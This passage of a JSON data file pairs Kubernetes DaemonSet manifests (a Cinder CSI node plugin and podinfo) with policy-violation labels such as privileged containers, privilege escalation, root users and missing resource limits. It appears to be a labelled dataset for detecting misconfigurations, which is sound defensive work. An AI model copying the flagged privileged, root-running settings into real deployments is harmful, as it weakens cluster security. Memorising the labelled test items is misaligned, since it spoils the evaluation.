CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cinder-csi-plugin\" does not have a read-only root file system"
  },
  {
    "id": "04094",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "04095",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"cinder-csi-plugin\" has AllowPrivilegeEscalation set to true."
  },
  {
    "id": "04096",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"cinder-csi-plugin\" is privileged"
  },
  {
    "id": "04097",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cinder-csi-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "04098",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "04099",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cinder-csi-plugin\" has cpu request 0"
  },
  {
    "id": "04100",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-driver-registrar\" has cpu request 0"
  },
  {
    "id": "04101",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cinder-csi-plugin\" has memory limit 0"
  },
  {
    "id": "04102",
    "manifest_path": "data/manifests/the_stack_sample/sample_1854.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-cinder-nodeplugin\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-cinder-nodeplugin\n  template:\n    metadata:\n      labels:\n        app: csi-cinder-nodeplugin\n    spec:\n      serviceAccount: csi-cinder-node-sa\n      containers:\n      - name: node-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.1.0\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/cinder.csi.openstack.org/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: cinder-csi-plugin\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - SYS_ADMIN\n          allowPrivilegeEscalation: true\n        image: docker.io/k8scloudprovider/cinder-csi-plugin:latest\n        args:\n        - /bin/cinder-csi-plugin\n        - --nodeid=$(NODE_ID)\n        - --endpoint=$(CSI_ENDPOINT)\n        - --cloud-config=$(CLOUD_CONFIG)\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/config/cloud.conf\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: pods-cloud-data\n          mountPath: /var/lib/cloud/data\n          readOnly: true\n        - name: pods-probe-dir\n          mountPath: /dev\n          mountPropagation: HostToContainer\n        - name: secret-cinderplugin\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/cinder.csi.openstack.org\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: pods-cloud-data\n        hostPath:\n          path: /var/lib/cloud/data\n          type: Directory\n      - name: pods-probe-dir\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: secret-cinderplugin\n        secret:\n          secretName: cloud-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-driver-registrar\" has memory limit 0"
  },
  {
    "id": "04103",
    "manifest_path": "data/manifests/the_stack_sample/sample_1855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: podinfo-ds\n  labels:\n    app.kubernetes.io/name: podinfo-ds\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: podinfo-ds\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app.kubernetes.io/name: podinfo-ds\n    spec:\n      containers:\n      - name: podinfod\n        image: ghcr.io/stefanprodan/podinfo:6.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        livenessProbe:\n          httpGet:\n            port: 9898\n            path: /healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            port: 9898\n            path: /readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 1m\n            memory: 16Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "04104",
    "manifest_path": "data/manifests/the_stack_sample/sample_1855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: podinfo-ds\n  labels:\n    app.kubernetes.io/name: podinfo-ds\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: podinfo-ds\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app.kubernetes.io/name: podinfo-ds\n    spec:\n      containers:\n      - name: podinfod\n        image: ghcr.io/stefanprodan/podinfo:6.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        livenessProbe:\n          httpGet:\n            port: 9898\n            path: /healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            port: 9898\n            path: /readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 1m\n            memory: 16Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "04105",
    "manifest_path": "data/manifests/the_stack_sample/sample_1864.yaml",
